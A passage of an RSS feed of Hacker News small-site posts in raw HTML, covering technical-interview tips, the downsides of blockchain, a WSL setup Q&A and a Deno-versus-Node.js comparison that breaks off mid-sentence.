<img width="399" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20399%20300'%3E%3C/svg%3E" alt="arrive on time 1" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1.jpg 399w, https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1-300x226.jpg 300w" data-lazy-sizes="(max-width: 399px) 100vw, 399px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1.jpg">
</picture>
</figure>
<p>Make sure you arrive at your technical interview on time. If you can’t, for some reason, please let us know, we’ll happily reorganize for another time, no hard feelings (sh*t happens). Showing up on time isn’t only about respecting each other’s schedule – interview time slots are usually 100% utilized and by arriving 10 minutes late you’re reducing your own chance to be successful. You’re also making it more stressful for yourself than necessary. If you need time for commute or for your Zoom/Google Meet setup, think ahead and give yourself a buffer before the start. You’ll also love the extra 10 minutes before the interview to tune in and get calmer.</p>
<h3 id="don-t-jump-right-into-solution-mode-read-distill-paraphrase"><span id="Dont_jump_right_into_solution_mode_-_read_distill_paraphrase">Don’t jump right into solution mode – read, distill, paraphrase</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 5">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1.jpg.webp 328w, https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1-300x274.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20328%20300'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 328px) 100vw, 328px">
<img width="328" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20328%20300'%3E%3C/svg%3E" alt="read distill paraphrase 1" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1.jpg 328w, https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1-300x274.jpg 300w" data-lazy-sizes="(max-width: 328px) 100vw, 328px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1.jpg">
</picture>
</figure>
<p>The biggest mistake you can do is thinking you understand the problem or what’s asked of you and jumping right into coding in the technical interview. Take your time, carefully read the problem statement, distill it, don’t think of solutions just yet. When you feel you understand what’s asked of you or when you thought about clarifying questions to ask, communicate. <a href="https://www.mindtools.com/pages/article/paraphrasing-summarizing.htm" target="_blank" rel="noopener">Paraphrase</a> what you understood from the problem statement so you can verify it with your interviewers. Only when you’re on the same page can you shift into solution mode. Even if you come up with the best solution ultimately if you skip this step I’ll remember and have doubts about how it’d be to work with you. Thinking aloud is really useful here – it will help you and help me too to understand what’s on your mind.</p>

<h3 id="be-articulate-and-communicate-clearly"><span id="Be_articulate_and_communicate_clearly">Be articulate and communicate clearly</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 6">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly.jpg.webp 401w, https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly-300x191.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20401%20255'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 401px) 100vw, 401px">
<img width="401" height="255" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20401%20255'%3E%3C/svg%3E" alt="communicate clearly" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly.jpg 401w, https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly-300x191.jpg 300w" data-lazy-sizes="(max-width: 401px) 100vw, 401px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly.jpg">
</picture>
</figure>
<p>Even if you know your trade and you’re the best engineer in the world, if you fail to communicate clearly during the technical interview we’ll have no way of knowing. This takes practice for most people, so take your time and prepare! Use standard terms that other engineers can relate to, avoid passive voice, and be able to articulate what’s going on in your mind while you’re thinking. If you need some time to think quietly, say so, don’t just fall silent suddenly. We’re trying our best to communicate our expectations around this but it might be a bit late when you’re in the interview. Trust me on this one, practice here goes a long way.</p>
<h3 id="ask-clarifying-questions"><span id="Ask_clarifying_questions">Ask clarifying questions</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 7">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/ask-clarifying-questions-1.jpg.webp" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20269%20300'%3E%3C/svg%3E">
<img width="269" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20269%20300'%3E%3C/svg%3E" alt="ask clarifying questions 1" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/ask-clarifying-questions-1.jpg">
</picture>
</figure>
<p>While you’d think the technical interview is about you answering questions, expect that you will need to ask a lot of them, too! When you are in the interview and something is not clear don’t default to thinking “Oh god, I should know this, I should understand” – sometimes we are interested in how you behave in such situations, and sometimes we’re just simply not good enough in giving enough context. If you’re stuck, a good technique is to ask for clarification! It’s also 100% OK to say things like “I didn’t quite get that. Could you rephrase please?” or “I’m not sure I understand what you’re asking”. These are good signals! I expect my team members to behave like this. These are not signals of you failing. I know it feels like that, but trust me, it’s just your brain playing tricks on you. I highlight this during the interview several times, to make sure the candidate feels safe asking such questions. Another technique I wholeheartedly welcome is paraphrasing – e.g. “What I understood from what you said is that I should implement this using co-monads” (said nobody ever).</p>
<h3 id="demonstrate-your-tech-skills-the-right-way"><span id="Demonstrate_your_tech_skills_the_right_way">Demonstrate your tech skills the right way</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 8">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/t-shaped-engineer.jpg.webp" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20293%20300'%3E%3C/svg%3E">
<img width="293" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20293%20300'%3E%3C/svg%3E" alt="t shaped engineer" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/t-shaped-engineer.jpg">
</picture>
</figure>
<p>Make us see that you’re deeply proficient in at least one technology. This can be a programming language, for example. Also, demonstrate that you know the adjacent technologies – most companies are looking for so-called <a href="https://www.forbes.com/sites/davidmichels/2019/09/27/going-pi-shaped-how-to-prepare-for-the-work-of-the-future/" target="_blank" rel="noopener">T-shape</a> engineers. This means that mentioning other aspects of the problem and the solution goes a long way. For example, if you’re asked to implement a service in NodeJS, mention how you’d deploy, monitor, and scale it, even if that’s not explicitly asked. No need to go into too many details (unless people ask you). If you’re only focused on a single piece of the puzzle I’ll have a hard time seeing how you’d perform well in a changing environment (where you’ll need to make connections and work on multiple zoom levels and be ready). This is a very generic statement and might not be true in the case of highly specialized roles, of course. On the other hand, …</p></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ochronus.online/acing-the-tech-interview/">https://ochronus.online/acing-the-tech-interview/</a></em></p>]]>
            </description>
            <link>https://ochronus.online/acing-the-tech-interview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067800</guid>
            <pubDate>Thu, 12 Nov 2020 08:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You don't need a blockchain solution for your next project]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25067702">thread link</a>) | @shrmv
<br/>
November 12, 2020 | https://exyte.com/blog/why-you-dont-need-a-blockchain-solution-for-your-next-project | <a href="https://web.archive.org/web/*/https://exyte.com/blog/why-you-dont-need-a-blockchain-solution-for-your-next-project">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>Blockchain is one of the hottest technology fields of the last decade, together with machine learning and big data. According to the <a rel="nofollow" href="https://www2.deloitte.com/content/dam/insights/us/articles/6608_2020-global-blockchain-survey/DI_CIR%202020%20global%20blockchain%20survey.pdf">Deloitte 2020 Global Blockchain Survey</a>, businesses worldwide find blockchain an integral part of organizational innovation. </p>
<p>Properly implemented, a blockchain solution can make parts of your business transparent or enable different actors to cooperate quickly and trustlessly. </p>
<p>But today, we wonâ€™t examine blockchainâ€™s strengths. Instead, we will look at why itâ€™s not the perfect choice for all your software projects.  </p>
<h2>Blockchain is more expensive</h2>
<p>From our experience, infrastructure and maintenance costs for a blockchain solution are typically 10-15 times higher compared to an ordinary server with a database running on AWS or a custom AWS/GCP/Azure solution.</p>
<p>Even when using economically efficient Azure solutions, it can cost up to ten times more when compared to a centralized DB with similar functionality running on AWS.</p>
<p>Therefore, itâ€™s necessary to seriously weigh the costs of running your solution vs. the need for transparency and distribution that blockchain offers. </p>
<h2>Blockchain scales worse</h2>
<p>Performance and scalability are the two major bottlenecks for any blockchain project. </p>
<p>From our experience working for large enterprise companies such as Bayer AG, Delta, PwC, and others, blockchain solutions that work fine for hundreds and thousands of users degrade in performance quite quickly when they need to serve more than ten thousand users.</p>
<p>Scaling blockchain, on the other hand, usually requires a complete rework of the core. Sometimes, there might even be no viable solution. So, despite some ambitious claims by blockchain companies, scaling is still an immature topic in the blockchain world.</p>
<h2>Blockchain is about transparency, not privacy</h2>
<p>Privacy is an issue. It is challenging to maintain privacy on the blockchain. In contrast to regular solutions, existing blockchain solutions are often all about transparency rather than privacy.</p>
<p>Solutions that provide the required level of privacy typically have to compromise on performance through zero-knowledge proofs or other kinds of encryption, which is costly.</p>
<p>Another problem with privacy is that most of the time, blockchain is permissionless or has very primitive permissions levels. Therefore, solutions for permissions are built on top of it as an additional middle layer, which, of course, adds performance overhead, degrades scalability, adds implementation and execution costs, etc.
Conclusion</p>
<p>There are three significant challenges that blockchain projects face: performance, scalability, and privacy. While there are multiple benefits for using blockchain, such as transparency and the ability to operate trustlessly, they need to be weighed against the downsides. </p>
<p>We want to share our knowledge with you about potential problems not to talk you away from blockchain, but to make sure the choice is clear and the right one for your project. If you still arenâ€™t sure and would like to have a 30-minute consultation with an expert in the field, youâ€™re welcome to <a href="https://exyte.com/contacts">contact us</a>. </p>
                </div></div>]]>
            </description>
            <link>https://exyte.com/blog/why-you-dont-need-a-blockchain-solution-for-your-next-project</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067702</guid>
            <pubDate>Thu, 12 Nov 2020 08:25:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WSL explained – crucial Q&A to get to know near-native Linux experience]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067677">thread link</a>) | @Pabloemm
<br/>
November 12, 2020 | https://solidstudio.io/blog/windows-subsystem-for-linux-explained.html | <a href="https://web.archive.org/web/*/https://solidstudio.io/blog/windows-subsystem-for-linux-explained.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p><a href="https://solidstudio.io/index.html">Solidstudio</a>
                    &gt;&gt;
                    <a href="https://solidstudio.io/blog/blog.html">Blog</a>
                    &gt;&gt;
                    &gt;Windows Subsystem for Linux (WSL) explained – Q&amp;A
                </p>
                <p>No matter if you program in <a href="https://solidstudio.io/technologies/java.html">Java</a> or <a href="https://solidstudio.io/technologies/kotlin.html">Kotlin</a> or with other technologies, operating on Linux has a number of advantages. One of them is access to Linux Bash with its useful commands.</p>
                <p>However, some developers have to or prefer working on Windows. As stackoverflow.com 2020 <a href="https://insights.stackoverflow.com/survey/2020#development-environments-and-tools" rel="nofollow">survey</a> showed, almost half of developers (45,8%) work in the Windows environment. There are tools that bring them closer to the Linux world like <a href="https://www.cygwin.com/" ref="nofollow">Cygwin</a>.</p>
                
                <h2>The WSL provides a near-native Linux experience</h2>
                <p>Some time ago Microsoft introduced WSL, a new tool that brings Windows users even closer to the Linux experience. Here you can find gathered some frequently asked questions and our expert’s experience to help you get a better understanding of the WSL.</p>
                
                <h3>What is WSL?</h3>
                <p>WSL or Windows Subsystem for Linux is a part of the Windows operating system that allows running native Linux binaries. A number of distributions exist that can be installed and used. </p>
                
                <h3>How can I install WSL?</h3>
                <p>First thing to do before installing any Linux distribution is to install the WSL itself.</p>
                <p>Go to <i>Control Panel</i> → <i>Programs</i> → <i>Programs and Features</i> → <i>Turn Windows features on and off</i>.</p>
                <p>Select <i>Windows Subsystem for Windows</i>, confirm, and restart the system.</p>
                <p><img src="https://solidstudio.io/img/blog/windows-subsystem-for-linux-explained/wsl-install.png" alt="Turn Windows features on and off dialog with Windows Subsystem for Linux selected"></p><p>Now you are ready to select and install a Linux distribution of your choice.</p>
                                
                <h3>What Linux distributions are available on WSL?</h3>
                <p>To find a list of available distributions open Windows Store and search for "Linux".<br>
                The most popular are:
                </p><ul>
                <li>Ubuntu 18.04 and 20.04</li>
                <li>SUSE Linux Enterprise Server</li>
                <li>Debian</li>
                <li>Fedora Remix for WSL</li>
                <li>Kali Linux</li>
                </ul>                
                <p><img src="https://solidstudio.io/img/blog/windows-subsystem-for-linux-explained/windows-store-search.png" alt="Windows Store search result for term Linux"></p><h3>Is it possible to run graphical Linux applications from WSL?</h3>
                <p>Yes, it is possible. You need to install an X Window System server application on your Windows, for example <a href="https://sourceforge.net/projects/xming/" rel="nofollow">Xming X Server for Windows</a>.</p>
                <p>Then check if your WSL system has a <span>DISPLAY</span> environment variable set up. If not set it to <span>:0</span>.</p>
                <pre>export DISPLAY=:0</pre>
                <p>After this configuration you are free to run native Linux applications with user interface.</p>
                <p><img src="https://solidstudio.io/img/blog/windows-subsystem-for-linux-explained/xclock.png" alt="WSL running xclock via Xming"></p><h3>Where is wsl.conf located?</h3>
                <p>Each WSL instance can be further configured by creating and editing a config file <span>/etc/wsl.conf</span>.</p>
                
                <h3>How to access Windows files from WSL?</h3>
                <p>All fixed drives with the NTFS or ReFS file system are automatically mounted in <span>/mnt</span> directory. For example a C: drive can be accessed in <span>/mnt/c/</span>. The directory where drives are mounted can be specified in <span>/etc/wsl.conf</span> as follows:</p>
                <pre>[automount]
root=/</pre>
                <p>This setting will cause drives to be mounted under the root folder, so the C: drive would be accessible through <span>/c</span> folder.</p>

                <h3>How to access pendrive from WSL?</h3>
                <p>Unlike fixed drives, removable drives are not mounted automatically. To access files stored on a USB stick you need to mount it yourself. For this purpose, use these commands (assume the drive letter in Windows is F):</p>
                <pre>sudo mkdir /mnt/f
sudo mount -t drvfs H: /mnt/f</pre>

                <h3>How to connect to a DVD drive from WSL?</h3>
                <p>Optical drives are not as popular nowadays as they used to be. Nonetheless, they can be accessed the same way as pendrives (assume G is the drive letter):</p>
                <pre>sudo mkdir /mnt/g
sudo mount -t drvfs G: /mnt/g</pre>

                <h3>Where are WSL files stored?</h3>
                <p>WSL files are exposed through a network share <span>\\wsl$\[distro name]</span>, for example my home directory is at <span "="">\\wsl$\Ubuntu-20.04\home\pawelb</span>.</p>
                <p>Physically the WSL files are located at <span>%USERPROFILE%\AppData\Local\Packages\[distro name]</span>. My home folder is at this rather long path <span>C:\Users\pawelb\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\home\pawelb</span>.</p>
                <p>However, it is worth noting that manipulating WSL files from within Windows should be avoided as it can destroy Linux-specific file metadata. If you need to manipulate files on both WSL and Windows, store them on a Windows drive and access them from within WSL via <span>/mnt</span>.</p>
                
                <h3>Is it possible to run Windows programs from within WSL?</h3>
                <p>Yes, the WSL was built with interoperability in mind. It can run native Windows programs. However, if this feature is not needed, the user can disable it by adding <span>enabled=false</span> into <span>[interop]</span> section in <span>wsl.conf</span>.</p>
                <pre>[interop]
enabled=false</pre>

                
                <h3>What terminal application to use?</h3>
                <p>Any terminal can do the job, even the good old <span>cmd.exe</span>. Just run the WSL command in. There is however one great application that makes running the WSL console easier. It’s <a href="https://docs.microsoft.com/en-us/windows/terminal/get-started" rel="nofollow">Windows Terminal</a> and it can be installed from Windows Store. It automatically detects any WSL distributions installed and adds an option to run its console. It also supports regular Windows Command Line, PowerShell, and Azure console out of the box. Also, it supports tabs and split view inside a tab.</p>
                <p><img src="https://solidstudio.io/img/blog/windows-subsystem-for-linux-explained/windows-terminal.png" alt="Windows Terminal application"></p><h3>Caveats of interoperability with Windows</h3>
                <p>By default, WSL can run Windows binaries and also appends its <span>%PATH%</span> variable into the <span>$PATH</span> variable of Linux running under WSL. In most cases, this is useful or at least does no harm. However, sometimes unexpected behavior occurs.</p>
                <p>This happened when I tried to run <span>npm</span>.</p>
                <pre>$ npm -v
module.js:471
    throw err;
    ^

Error: Cannot find module '\\wsl$\Ubuntu-20.04\c\Programs\nvm\v6.10.2\node_modules\npm\bin\npm-cli.js'
    at Function.Module._resolveFilename (module.js:469:15)
    at Function.Module._load (module.js:417:25)
    at Module.runMain (module.js:604:10)
    at run (bootstrap_node.js:393:7)
    at startup (bootstrap_node.js:150:9)
    at bootstrap_node.js:508:3</pre>
                
                <p>This error message is not helpful at all. What happened?</p>
                <p>After some investigation, I found out that I had also installed npm on Windows and WSL was using this executable to run. This unfortunately failed under WSL environment.</p>
                <p>A fix was rather simple. I disabled appending Windows <span>%PATH%</span> to WSL <span>$PATH</span>.</p>
                <p>This can be done in two ways.</p>
                <p>The first is to use the Registry Editor (regedit) to add a DWORD <span>AppendNtPath</span> with value <span>0</span> under <span>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss</span>. This affects all WSL distributions.</p>
                <p>The second way is to set a property in <span>/etc/wsl.conf</span>. This affects only a single distribution.</p>
                <pre>[interop]
appendWindowsPath=false</pre>

                <h2>The WSL is a great subsystem for Windows </h2>
                <p>With the introduction of Windows 10, a lot has changed. It seems that the system and its features are more and more thought-out and intuitive. A programmer needs a proper working environment. With WSL, Windows is keeping up with developments in this area, and looks like it is a step in the right direction. It’s worth having an eye on the development of this solution, hoping that in the future the developers will have a variety of systems that can really compete with each other. Looking for a good and stable, seamless tool, it is worth trying with the WSL.</p>
                
                
                
            </div></div>]]>
            </description>
            <link>https://solidstudio.io/blog/windows-subsystem-for-linux-explained.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067677</guid>
            <pubDate>Thu, 12 Nov 2020 08:21:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deno is the same as Node.js, but different]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067625">thread link</a>) | @velmu
<br/>
November 12, 2020 | https://developers.ibexa.co/blog/deno-is-the-same-as-node.js-but-different | <a href="https://web.archive.org/web/*/https://developers.ibexa.co/blog/deno-is-the-same-as-node.js-but-different">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>JavaScript has been on a roll for more than a decade now. What started as a language used for sprinkling some interactivity to static HTML has grown to be arguably the world's most widespread general purpose programming language. The hegemony of JavaScript is also evident on the server side, with Node.js being a staple of job ads for many years. Recently there's been some buzz around a similar technology:&nbsp;<a href="https://deno.land/" title="">Deno</a></p><div><p>Let's find out what Deno is and how it compares with <a href="https://nodejs.org/" title="">Node.js</a>. First things first: The name Deno is an <a href="https://www.arrak.fi/en/ag" title="">anagram</a> of Node, and they are two&nbsp;different open source software projects.&nbsp;Deno&nbsp;sounds like a cheap knock-off of the more established Node.js, given the two technologies' problem domain and overall similarity. But once you learn both were originally kicked off by the same person, <a href="https://en.wikipedia.org/wiki/Ryan_Dahl" title="">Ryan Dahl</a>,&nbsp;it changes the perception.</p><p>Dahl released the first version of Node.js in May 2009. In January 2012 he stepped aside from the project to focus on other things. To the surprise of many he announced Deno in 2018 at a conference talk titled&nbsp;<a href="https://www.youtube.com/watch?v=M3BM9TB-8yA" title="">10 Things I Regret About Node.js</a>. in his talk, the primus motor of Node.js outlines some of the things he'd do differently today.&nbsp;That is what Deno is: An alternative&nbsp;take on a server-side JavaScript runtime.</p><p>Since the unveiling of&nbsp;Deno a developer community has grown&nbsp;around it. To many outside of the dev realm their efforts culminated in the <a href="https://deno.land/posts/v1" title="">launch of&nbsp;1.0</a> in May 2020.</p><h3>What do Node.js and Deno have in common?</h3><p>Both Deno and Node run on the same technology platform: The <a href="https://en.wikipedia.org/wiki/V8_(JavaScript_engine)" title="">V8 JavaScript engine</a>. This is a widespread JavaScript runtime that is largely developed by Google for their <a href="https://en.wikipedia.org/wiki/Google_Chrome" title="">Chrome</a> web browser, but is also present in&nbsp;<a href="https://www.chromium.org/" title="">Chromium</a> variants like <a href="https://opera.com/" title="">Opera</a> and <a href="https://www.microsoft.com/en-us/edge" title="">Microsoft Edge</a>. The&nbsp;<a href="https://v8.dev/" title="">V8 project</a> has&nbsp;received huge investments in time and resources from volunteers and companies. In short,&nbsp;V8 is a killer: It's blazing fast and gets new language features from&nbsp;<a href="https://www.ecma-international.org/publications/standards/Ecma-262.htm" title="">ECMAScript-262</a> (the standard that defines <a href="https://en.wikipedia.org/wiki/JavaScript" title="">JavaScript</a>).</p><p>Node and Deno both do more or less the same thing: They run JavaScript code on a server (yes, there is always a server, even if you're <a href="https://en.wikipedia.org/wiki/Serverless_computing" title="">serverless</a>). The range of apps that can be&nbsp;built&nbsp;is wide; a&nbsp;data pump proxying streams of data from one location and format to another is a common use case, as are API backends for <a href="https://en.wikipedia.org/wiki/Single-page_application" title="">SPAs</a>,&nbsp;but you can also write complex full-stack backend apps like the <a href="https://ghost.org/" title="">Ghost blogging platform</a> or custom apps with <a href="https://developers.ibexa.co/content-root/blog/getting-started-with-next.js-and-ez-platform">a framework like Next.js</a>&nbsp;that runs&nbsp;<a href="https://en.wikipedia.org/wiki/Isomorphic_JavaScript" title="">on the server and the client</a>.</p><p>The shared architecture of JavaScript/V8 means both share similar performance characteristics. There can be some differences, where one is better than the other - but as a baseline both are performant enough for most uses and can be scaled horizontally. If you're looking for the absolute best throughput you should probably <a href="https://www.ageofascent.com/2019/02/04/asp-net-core-saturating-10gbe-at-7-million-requests-per-second/" title="">look at something like .NET Core</a> or something very&nbsp;low level. There are areas where V8 performance won't cut it, but if you're in those fields then you probably know it.</p><p>The JavaScript ecosystem is massive. The core skills you need to work with either Node or Deno are very similar. The syntax is identical, even though Deno actually enforces the use of <a href="https://www.typescriptlang.org/" title="">TypeScript</a>&nbsp;in the <a href="https://en.wikipedia.org/wiki/User_space" title="">userland</a>. TypeScript is a superset of JavaScript, adding optional typing and other features that can be useful in development phase. It's also worth noting that you can also develop Node.js apps in TypeScript, and ultimately the V8 engine executes loosely JavaScript that is compiled from the TypeScript source.</p><h3>How is Deno different from Node.js?</h3><p>Unlike with Node, the use of TypeScript is a requirement with Deno. Some parts of Deno itself are written in TypeScript, but <a href="https://startfunction.com/deno-will-stop-using-typescript/" title="">the team is looking to change that</a> as it is not well suited for that purpose. TS is <a href="https://basarat.gitbook.io/typescript/type-system" title="">not strictly typed</a> and does not offer a bullet proof runtime enforcing 100% <a href="https://en.wikipedia.org/wiki/Type_safety" title="">type safety</a>, but relies quite a bit&nbsp;on <a href="https://en.wikipedia.org/wiki/Type_inference" title="">type inference</a>&nbsp;to <a href="https://symfony.fi/entry/a-practical-introduction-to-typescript-for-php-developers#make-javascript-great-again" title="">enable type checking and associated development time tooling in&nbsp;IDEs for JavaScript</a>.</p><p>Another significant difference is the security model. Node.js never had a universal security model baked in. This means that it easy to write code that will do a lot of harm in the wrong hands,&nbsp;maliciously&nbsp;or accidentally. The approach in Deno is different,&nbsp;in line with browsers and the <a href="https://developers.ibexa.co/content-root/blog/secure-by-default-why-the-role-based-permission-model-offers-powerful-security" title="">Ibexa DXP permissions&nbsp;model</a>:</p><blockquote><p>Deno is secure by default. Therefore, unless you specifically enable it, a deno module has no file, network, or environment access for example. Access to security-sensitive areas or functions requires the use of permissions to be granted to a deno process on the command line.<br>- <a href="https://deno.land/manual/getting_started/permissions" title="">Deno Manual: Permissions</a></p></blockquote><p>The <a href="https://en.wikipedia.org/wiki/Standard_library" title="">standard library</a> is another area where Deno is different from Node.js. Node has a fairly small standard library, which has lead into a large number of&nbsp;external packages for (what some think) should be offered by default in the distribution. For Deno this is again different, as they offer a more comprehensive standard library inspired by&nbsp;<a href="https://golang.org/" title="">Go</a>:</p><blockquote><p>deno_std is a loose port of&nbsp;<a href="https://golang.org/pkg/">Go's standard library</a>. When in doubt, simply port Go's source code, documentation, and tests. There are many times when the nature of JavaScript, TypeScript, or Deno itself justifies diverging from Go, but if possible we want to leverage the energy that went into building Go. We generally welcome direct ports of Go's code.<br>- <a href="https://deno.land/std" title="">Deno Standard Library</a></p></blockquote><p>Related to external packages, this is another big difference between the two. Node.js relies on a central repository, <a href="https://www.npmjs.com/" title="">NPM</a>, for storing and delivering libraries and other code. This ecosystem is a huge benefit for developers as it reduces&nbsp;<a href="https://en.wikipedia.org/wiki/Duplicate_code" title="">duplication</a>. With <a href="https://snyk.io/blog/npm-passes-the-1-millionth-package-milestone-what-can-we-learn/" title="">over a million packages on NPM</a>,&nbsp;it's a common phrase to say <em>there's an NPM package for that</em>&nbsp;in the developer circles. And often this is true, and the benefits are obvious.</p><p>Shared code is good code, and Deno does not intend to implement everything in the <em>stdlib</em>. What is fundamentally different is the distribution model. Instead of a central repository, <a href="https://deno.land/manual/linking_to_external_code" title="">any URL can contain a package</a>. The project hosts a set of packages over at&nbsp;<a href="https://deno.land/x">deno.land/x</a>, but it is not enforced anywhere. This means there is no central owner like with&nbsp;<a href="https://en.wikipedia.org/wiki/Npm_(software)" title="">NPM</a> (now <a href="https://github.blog/2020-03-16-npm-is-joining-github/" title="">owned by GitHub</a> <a href="https://news.microsoft.com/announcement/microsoft-acquires-github/" title="">owned by Microsoft</a>). This approach means you can host a <a href="https://en.wikipedia.org/wiki/Web_server" title="">HTTP server</a> (public or private) and reference libraries directly from there.</p><p>Another area related to extensions is the simplification of code packaging. When Node.js came around, there was no standard <a href="https://en.wikipedia.org/wiki/Modular_programming" title="">module format</a> in the ECMAScript spec. This is why Node.js rolled&nbsp;its&nbsp;own module format, known as&nbsp;<a href="https://en.wikipedia.org/wiki/CommonJS" title="">CommonJS</a>. Because of the popularity of Node.js, CommonJS became the <a href="https://en.wikipedia.org/wiki/De_facto_standard" title="">de facto standard</a>&nbsp;for modules in the JavaScript ecosystem. Since that time the ECMAScript has received regular updates and now includes a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules" title="">standard JavaScript Modules</a>&nbsp;that also <a href="https://jakearchibald.com/2017/es-modules-in-browsers/" title="">work in browsers</a>.</p><p>Nowadays <a href="https://nodejs.medium.com/announcing-core-node-js-support-for-ecmascript-modules-c5d6dc29b663" title="">Node.js also&nbsp;supports JavaScript&nbsp;modules</a>, but much of the ecosystem continues to use CommonJS. Both formats do more or less the same thing, but with a different syntax. This can make it confusing to work with Node since you can use two different ways for a core functionality.&nbsp;<a href="https://deno.land/manual/examples/import_export" title="">Deno standardizes on ECMAScript modules</a>.</p>        
<div>
    
    
    <figure><img src="https://developers.ibexa.co/var/site/storage/images/_aliases/medium/0/0/3/2/112300-1-eng-GB/deno-mascot.png" alt="" height="188" width="200"></figure>

</div>
<p>Finally there's the mascot, Deno. Just take a look at the <a href="https://deno.land/artwork" title="">artwork from the collection</a> (blog post main image courtesy of&nbsp;<a href="https://www.dimitrijagal.com/" title="">Dimitrij Agal</a>).&nbsp;Who could say no to the lil' one?</p><h3>Conclusion</h3><p>As we've learnt there are a number of similarities between Deno and Node.js, but also some key differences in philosophy and implementation. Perhaps the <a href="https://github.com/denoland/deno/issues/47" title="">most controversial difference</a> is the novel take on dependency management in Deno. Resolving a complex set of dependencies could be more challenging (and potentially more unreliable)&nbsp;in this fully distributed model. It's worth noting that you can use packages from the&nbsp;NPM catalogue with <a href="https://jspm.org/" title="">jspm&nbsp;that hosts NPM packages as ES modules</a>.</p><p>Node.js has massive clout on the market, it is a hot technology and developers are sought after by both startups and enterprises. The vibrant ecosystem&nbsp;proves that there is nothing fundamentally wrong with Node.js and it&nbsp;is a big part of the JavaScript success story of the last decade. Node.js is not going anywhere, but&nbsp;Deno could carve out&nbsp;a niche for itself. One thing&nbsp;that comes to mind is&nbsp;FaaS (<a href="https://en.wikipedia.org/wiki/Function_as_a_service" title="">Function as a Service</a>), whose development could be simpler&nbsp;with Deno's more&nbsp;extensive&nbsp;standard library.</p><p>But wait a minute... This is the <a href="https://www.ibexa.co/" title="">Ibexa</a> blog. What's Deno got to do with you? Well, nothing as of now. We're using plenty of JavaScript, for example,&nbsp;<a href="https://www.reactjs.org/" title="">React.js components</a> for the administration user interface, and our asset build pipeline is Node.js based, courtesy of <a href="https://symfony.com/doc/current/frontend/encore/installation.html" title="">Symfony Encore</a>. But as of now the&nbsp;<a href="https://developers.ibexa.co/content-root/products" title="">Ibexa DXP line of products</a> aren't utilizing any active JavaScript server <a href="https://en.wikipedia.org/wiki/Daemon_(computing)" title="">daemons</a> in Node.js, Deno or <a href="https://cs.nyu.edu/~yap/html/tutorial/getstart.htm" title="">Netscape Livewire</a>.</p><p>Implementations where Ibexa DXP is deployed are a different case. Our technology is often a piece of a puzzle involving many technology components, from&nbsp;<a href="https://en.wikipedia.org/wiki/A/B_testing" title="">A/B testing</a> services to&nbsp;<a href="https://developers.ibexa.co/content-root/resources/ebooks/e-commerce-integration-with-erp-and-other-business-systems-pim-and-crm">integrations to enterprise backend systems like ERPs</a>. This is where server side JavaScript is widely used, most commonly as <a 